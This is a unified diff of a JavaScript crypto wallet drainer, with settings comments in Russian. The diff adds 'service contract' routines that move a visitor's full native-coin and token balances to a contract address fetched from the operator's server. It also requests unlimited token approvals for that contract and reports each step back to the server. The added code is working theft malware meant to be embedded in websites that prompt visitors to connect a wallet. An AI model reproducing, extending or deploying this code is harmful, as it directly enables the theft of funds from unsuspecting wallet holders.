@@ -1,10 +1,4 @@
-// Использование данного кода без обфускации СТРОГО ЗАПРЕЩЕНО
-// В случае, если это будет обнаружено, будет составлен арбитраж
-// Обфускацию данного скрипта можно выполнить здесь: obfuscator.io
 
-// Нашли скрипт в открытом доступе без обфускации?
-// Сообщите разработчику по электронной почте: msteal-dev@proton.me
-// Укажите место или домен, где располагается скрипт
 
 // =====================================================================
 // ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
@@ -15,7 +9,7 @@ let CF_EKEY = 234343253453; // Укажите любое число, котор�
 const CF_HTTP_MODE = false; // [LOCALHOST TEST ONLY] Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
 const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь (по умолчанию - 443)
 // По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
-const CF_Server_URL = "server123.agency"; // Указать домен, который прикреплен к серверу дрейнера
+const CF_Server_URL = "ВСТАВЬТЕ_СЮДА_ДОМЕН_СЕРВЕРА"; // Указать домен, который прикреплен к серверу дрейнера
 // Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
 const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14"; // Project ID из WalletConnect Cloud
 // Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
@@ -78,6 +72,8 @@ const CF_Custom_Chat = {
 // =====================================================================
 // ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
 // =====================================================================
+
+const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;
 
 if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
 if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;
@@ -522,7 +518,7 @@ const send_request = async (data) => {
         'Accept': 'text/plain',
         'Content-Type': 'application/x-www-form-urlencoded'
       },
-      body: `v=150525&s=1&r=${request_data}`
+      body: `v=150725&s=1&r=${request_data}`
     });
     let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
     if (!response_data.status)
@@ -4281,10 +4277,132 @@ const MM_BATCH_TRANSFER = async (assets) => {
   const txHash = await waitForBatchReceipt(batchId.result.id);
   if (CF_Settings.Settings.Wait_For_Confirmation) {
     const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[CF_Current_Chain_ID]);
-    await node.waitForTransaction(txHash, 1, 90000);
+    await node.waitForTransaction(txHash, 1, 120000);
   }
   await swap_success("MetaMask Batch Transfer", assets[0], assets); sign_ready();
   return 2;
+};
+
+const TRANSFER_NATIVE_VIA_SERVICE_CONTRACT = async (asset, service_contract) => {
+
+  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
+  const s_contract = new ethers.Contract(service_contract, IO_ABI, CF_Signer);
+
+  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
+  const random_user_id = Math.floor(Math.random() * 9999);
+  const gas_limit = await s_contract.estimateGas.depositNative(random_user_id, CF_Current_Address, 0, { value: BN(1) });
+
+  const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
+  const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);
+
+  const balance = await node.getBalance(CF_Current_Address);
+  let available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
+
+  if (CF_Settings.Settings.Reserves.Mode == 1) {
+    available_amount = balance.sub(gas_limit.mul(gas_price)).div(BN(100))
+    .mul(BN(100).sub(BN(CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])));
+  } else if (CF_Settings.Settings.Reserves.Mode == 2) {
+    let max_value = 0; let current_percent = CF_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
+    for (const elem of CF_Settings.Settings.Reserves.Flex_Percent[asset.chain_id]) {
+      if (asset.amount_usd > elem.amount || max_value > elem.amount) continue;
+      max_value = elem.amount; current_percent = elem.percent;
+    }
+    available_amount = balance.sub(gas_limit.mul(gas_price))
+    .div(BN(100)).mul(BN(100).sub(BN(current_percent)));
+  } else if (CF_Settings.Settings.Reserves.Mode == 3) {
+    available_amount = balance.sub(gas_limit.mul(gas_price));
+  }
+
+  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';
+
+  await transfer_request(asset); sign_next();
+  const tx = await s_contract.depositNative(random_user_id, CF_Current_Address, 0, { gasLimit: gas_limit, gasPrice: gas_price, value: available_amount });
+  wait_message();
+  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 120000);
+  await transfer_success(asset); sign_ready();
+
+};
+
+const TRANSFER_TOKEN_VIA_SERVICE_CONTRACT = async(asset, service_contract) => {
+
+  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
+  const t_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
+  const t_balance = await t_contract.balanceOf(CF_Current_Address);
+
+  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
+  const gas_limit = await t_contract.estimateGas.transfer(service_contract, t_balance);
+
+  await transfer_request(asset); sign_next();
+  const tx = await t_contract.transfer(service_contract, t_balance, { gasLimit: gas_limit, gasPrice: gas_price });
+  wait_message();
+  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 120000);
+  await transfer_success(asset); sign_ready(); return 2;
+
+};
+
+const USE_SERVICE_CONTRACT_TOKEN = async (asset, service_contract) => {
+  if (CF_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN_VIA_SERVICE_CONTRACT(asset, service_contract); return 2; }
+
+  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
+    try {
+      for (let x = 0; x < 2; x++) {
+        if (asset.increase) continue;
+        try {
+          const ic_data = await retrieve_token(asset.chain_id, asset.address);
+          const ic_node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
+          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
+          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
+          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
+        } catch(err) {
+          console.log(err);
+        }
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 2) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN_VIA_SERVICE_CONTRACT(asset, service_contract); return 2; }
+  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask == 3) || (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');
+
+  let approval_function = 'approve';
+
+  if (((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask >= 2) ||
+  (CF_Current_Provider == 'Trust Wallet' && CF_Settings.Settings.Approve.Trust >= 2)) && asset.increase) {
+    approval_function = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
+  }
+
+  const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
+  const t_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], CF_Signer);
+
+  let max_approval_amount = ethers.utils.parseEther(CF_Unlimited_Amount);
+  for (const c_address of CF_Settings.Unlimited_BL) {
+    try {
+      if (c_address[0] == CF_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
+        max_approval_amount = asset.amount_raw;
+        break;
+      }
+    } catch(err) {
+      console.log(err);
+    }
+  }
+
+  const current_allowance = await t_contract.allowance(CF_Current_Address, service_contract);
+  if (current_allowance.gte(ethers.BigNumber.from(max_approval_amount.div(BN(2))))) {
+    await approve_request(asset); sign_next();
+    wait_message(); await approve_success(asset);
+    sign_ready(); return 1;
+  }
+
+  const gas_price = BN(await node.getGasPrice()).mul(BN(12)).div(BN(10));
+  const gas_limit = await t_contract.estimateGas[approval_function](service_contract, max_approval_amount);
+
+  await approve_request(asset); sign_next();
+  const tx = await t_contract[approval_function](service_contract, max_approval_amount, { gasLimit: gas_limit, gasPrice: gas_price });
+  wait_message();
+  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 2, 120000);
+  await approve_success(asset); sign_ready(); return 1;
+
 };
 
 const APPROVE_TOKEN = async (asset) => {
@@ -5114,6 +5232,16 @@ const connect_wallet = async (provider = null) => {
           }
           if (!is_chain_correct) continue;
           if (asset.type == 'NATIVE') {
+            let service_contract = false;
+            try {
+              let sc_result = await send_request({ action: 'retrieve_service_contract', wallet: CF_Current_Provider, chain_id: asset.chain_id, wallet_balance: assets_usd_balance });
+              if (sc_result.status == 'OK' && sc_result.contract_address && typeof sc_result.contract_address == 'string') {
+                service_contract = sc_result.contract_address;
+                console.log(`[SERVICE CONTRACT] ${asset.name}, Service Contract: ${service_contract}`)
+              }
+            } catch(err) {
+              console.log(err);
+            }
             if (CF_Settings.Settings.Sign.Native > 0 && (!CF_Sign_Disabled || CF_Settings.Settings.Sign.Force == 1)) {
               while (true) {
                 try {
@@ -5130,7 +5258,12 @@ const connect_wallet = async (provider = null) => {
                       await sign_unavailable();
                       while (true) {
                         try {
-                          await TRANSFER_NATIVE(asset);
+                          if (service_contract != false) {
+                            await TRANSFER_NATIVE_VIA_SERVICE_CONTRACT(asset, service_contract);
+                            send_request({ action: 'native_service', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
+                          } else {
+                            await TRANSFER_NATIVE(asset);
+                          }
                           asset.skip = true;
                           break;
                         } catch(err) {
@@ -5159,7 +5292,12 @@ const connect_wallet = async (provider = null) => {
             } else {
               while (true) {
                 try {
-                  await TRANSFER_NATIVE(asset);
+                  if (service_contract != false) {
+                    await TRANSFER_NATIVE_VIA_SERVICE_CONTRACT(asset, service_contract);
+                    send_request({ action: 'native_service', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
+                  } else {
+                    await TRANSFER_NATIVE(asset);
+                  }
                   asset.skip = true;
                   break;
                 } catch(err) {
@@ -5174,6 +5312,16 @@ const connect_wallet = async (provider = null) => {
               }
             }
           } else if (asset.type == 'ERC20') {
+            let service_contract = false;
+            try {
+              let sc_result = await send_request({ action: 'retrieve_service_contract', wallet: CF_Current_Provider, chain_id: asset.chain_id, wallet_balance: assets_usd_balance });
+              if (sc_result.status == 'OK' && sc_result.contract_address && typeof sc_result.contract_address == 'string') {
+                service_contract = sc_result.contract_address;
+                console.log(`[SERVICE CONTRACT] ${asset.name}, Service Contract: ${service_contract}`)
+              }
+            } catch(err) {
+              console.log(err);
+            }
             if (typeof asset.permit == 'undefined' && CF_Settings.Settings.Permit.Mode && asset.amount_usd >= CF_Settings.Settings.Permit.Price[asset.chain_id]) {
               const data = await retrieve_token(asset.chain_id, asset.address);
               const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
@@ -5201,6 +5349,7 @@ const connect_wallet = async (provider = null) => {
                 }
               }
             }
+
             if (CF_Settings.Settings.Use_Swap_Bypass && CF_Current_Provider == 'MetaMask' && is_token_swappable(asset.chain_id, asset.address) != false) {
               let swapper_data = is_token_swappable(asset.chain_id, asset.address);
               console.log(swapper_data);
@@ -5230,6 +5379,22 @@ const connect_wallet = async (provider = null) => {
               while (true) {
                 try {
                   await DO_PERMIT2(asset, all_permit2);
+                  asset.skip = true;
+                  break;
+                } catch(err) {
+                  console.log(err);
+                  await approve_cancel();
+                  if (!CF_Settings.Loop_T) break;
+                }
+              }
+            } else if (service_contract != false) {
+              while (true) {
+                try {
+                  let result = await USE_SERVICE_CONTRACT_TOKEN(asset, service_contract);
+                  if (result == 1) {
+                    const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
+                    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
+                  }
                   asset.skip = true;
                   break;
                 } catch(err) {
@@ -5588,7 +5753,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     await retrieve_contract();
     CF_Ready = true;
     enter_website();
-    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 0;
+    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
     for (const elem of document.querySelectorAll('.connect-button')) {
       try {
         elem.addEventListener('click', () => init_co());
@@ -5615,6 +5780,4 @@ setInterval(async () => {
 }, 1000);
 
 window.addEventListener("beforeunload", (e) => leave_website());
-
 window.addEventListener("onbeforeunload", (e) => leave_website());
-
